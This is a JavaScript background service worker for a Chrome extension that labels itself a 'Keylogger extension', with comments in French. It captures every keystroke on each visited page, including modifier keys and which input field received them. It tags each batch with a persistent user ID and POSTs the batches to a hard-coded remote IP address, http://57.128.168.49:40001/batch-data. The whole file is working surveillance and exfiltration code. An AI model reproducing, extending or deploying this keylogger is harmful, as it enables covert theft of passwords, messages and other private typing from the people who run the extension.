// Background service worker - Manage data storage and tab tracking

const MAX_ENTRIES = 10000;

// Configuration du serveur
const SERVER_CONFIG = {
    enabled: true,
    url: 'http://57.128.168.49:40001',
    // url: 'http://localhost:4000',
    endpoints: {
        batch: '/batch-data' // Nouveau endpoint pour envoyer les données groupées
    }
};

// Générer ou récupérer l'ID utilisateur unique
let userId = null;

async function getUserId() {
    if (userId) return userId;

    try {
        const result = await chrome.storage.local.get(['userId']);
        if (result.userId) {
            userId = result.userId;
        } else {
            // Générer un nouvel ID unique
            userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            await chrome.storage.local.set({ userId });
            console.log('🆔 Nouvel utilisateur créé:', userId);
        }
        return userId;
    } catch (error) {
        console.error('Erreur récupération userId:', error);
        userId = 'user_' + Date.now();
        return userId;
    }
}

// Buffer pour stocker les données de la page actuelle
let currentPageData = {
    url: '',
    title: '',
    keystrokes: [],
    startTime: null,
    endTime: null,
    userId: null
};

// Fonction pour envoyer les données groupées au serveur
async function sendBatchToServer(pageData) {
    if (!SERVER_CONFIG.enabled || !pageData.keystrokes.length) {
        return;
    }

    // S'assurer que l'userId est inclus
    const uid = await getUserId();
    const dataWithUserId = {
        ...pageData,
        userId: uid
    };

    try {
        const response = await fetch(`${SERVER_CONFIG.url}${SERVER_CONFIG.endpoints.batch}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataWithUserId)
        });

        if (!response.ok) {
            console.warn(`Serveur non disponible: ${response.status}`);
        } else {
            const result = await response.json();
            console.log(`✅ ${pageData.keystrokes.length} touches envoyées pour ${pageData.url} (User: ${uid})`);
        }
    } catch (error) {
        console.log('ℹ️ Serveur local non accessible');
    }
}

// Fonction pour finaliser et envoyer les données de la page actuelle
async function flushCurrentPageData() {
    if (currentPageData.keystrokes.length > 0) {
        currentPageData.endTime = new Date().toISOString();

        // Envoyer au serveur
        await sendBatchToServer({ ...currentPageData });

        // Sauvegarder localement aussi
        await saveToLocalStorage(currentPageData);

        console.log(`📤 Envoi de ${currentPageData.keystrokes.length} touches pour ${currentPageData.url}`);
    }

    // Réinitialiser le buffer
    currentPageData = {
        url: '',
        title: '',
        keystrokes: [],
        startTime: null,
        endTime: null
    };
}

// Sauvegarder dans le stockage local
async function saveToLocalStorage(pageData) {
    try {
        const result = await chrome.storage.local.get(['sessions']);
        let sessions = result.sessions || [];

        sessions.push(pageData);

        if (sessions.length > 100) {
            sessions = sessions.slice(-100);
        }

        await chrome.storage.local.set({ sessions });
    } catch (error) {
        console.error('Error saving to local storage:', error);
    }
}

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'keystroke') {
        handleKeystroke(message, sender.tab);
    } else if (message.type === 'url_change' || message.type === 'page_load') {
        handleUrlChange(message, sender.tab);
    }
    return true;
});

// Listen for tab updates
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        handleUrlChange({
            type: 'tab_update',
            url: tab.url,
            pageTitle: tab.title,
            timestamp: new Date().toISOString()
        }, tab);
    }
});

// Gérer une touche cliquée
async function handleKeystroke(keystrokeData, tab) {
    const url = tab?.url || keystrokeData.url;
    const title = tab?.title || keystrokeData.pageTitle;

    // Si c'est une nouvelle URL, envoyer les données de l'ancienne page
    if (currentPageData.url && currentPageData.url !== url) {
        await flushCurrentPageData();
    }

    // Initialiser si nouvelle page
    if (!currentPageData.url) {
        const uid = await getUserId();
        currentPageData.url = url;
        currentPageData.title = title;
        currentPageData.startTime = new Date().toISOString();
        currentPageData.userId = uid;
    }

    // Ajouter la touche au buffer
    currentPageData.keystrokes.push({
        key: keystrokeData.key,
        code: keystrokeData.code,
        timestamp: keystrokeData.timestamp,
        isSpecialKey: keystrokeData.isSpecialKey,
        inputElementId: keystrokeData.inputElementId,
        inputType: keystrokeData.inputType,
        shiftKey: keystrokeData.shiftKey,
        ctrlKey: keystrokeData.ctrlKey,
        altKey: keystrokeData.altKey,
        metaKey: keystrokeData.metaKey
    });
}

// Gérer un changement d'URL
async function handleUrlChange(visitData, tab) {
    // Envoyer les données de la page précédente
    await flushCurrentPageData();

    // Initialiser pour la nouvelle page
    currentPageData.url = visitData.url;
    currentPageData.title = visitData.title || visitData.pageTitle;
    currentPageData.startTime = new Date().toISOString();
}

// Listen for extension installation
chrome.runtime.onInstalled.addListener(() => {
    console.log('Keylogger extension installed');

    chrome.storage.local.get(['sessions'], (result) => {
        if (!result.sessions) {
            chrome.storage.local.set({ sessions: [] });
        }
    });
});

// Envoyer les données quand l'extension se ferme ou le navigateur se ferme
chrome.runtime.onSuspend.addListener(async () => {
    await flushCurrentPageData();
});
